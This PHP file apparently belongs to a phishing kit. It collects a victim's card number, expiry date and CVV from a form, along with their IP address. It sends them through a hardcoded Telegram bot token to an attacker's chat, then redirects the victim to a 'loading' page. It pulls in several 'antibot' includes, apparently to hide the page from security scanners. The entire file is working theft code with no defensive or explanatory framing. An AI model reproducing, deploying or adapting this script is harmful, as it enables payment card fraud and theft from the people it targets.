<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

// Token du bot Telegram et ID du chat
$botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
$chatId = "8134069302";

// Récupération des données du formulaire
$cardNumber = htmlspecialchars($_POST['cardNumber'] ?? '');
$expiryDate = htmlspecialchars($_POST['expiryDate'] ?? '');
$cvv = htmlspecialchars($_POST['cvv'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'];

// Vérifier que tous les champs sont remplis
if (empty($cardNumber) || empty($expiryDate) || empty($cvv)) {
    echo "Tous les champs doivent être remplis.";
    exit;
}

// Message formaté pour Telegram
$message  = "<b>💳 Détails de la Carte Bancaire :</b>\n\n";
$message .= "<b>Numéro de Carte :</b> <code>$cardNumber</code>\n";
$message .= "<b>Date d'Expiration :</b> <code>$expiryDate</code>\n";
$message .= "<b>CVV :</b> <code>$cvv</code>\n";
$message .= "<b>🌐 IP :</b> <code>$ip</code>";

// Envoi via API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML' // Pour utiliser <b> et <code>
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Redirection
header("Location: ../chargement.php");
exit;
?>
